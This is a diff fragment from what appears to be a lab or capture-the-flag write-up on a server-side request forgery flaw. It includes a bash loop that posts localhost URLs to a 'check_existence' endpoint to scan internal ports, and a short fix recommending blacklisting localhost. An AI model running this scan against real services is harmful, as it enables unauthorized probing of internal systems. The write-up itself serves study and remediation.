@@ -34,7 +34,7 @@ automated:
 in burp right click request and copy as bash script, modify in loop to:
 for i in {1..10000} ; do echo $i; curl -i -s -k  -X $'POST' -F url=http://127.0.0.1:${i} $'http://security:5000/check_existence' |grep "is reach" ; done ;
 not very pretty but it works...
--> other open port 5000
+-> other open port 5432
 ##Fix
 blacklist localhost, so it won't search in its own space
 
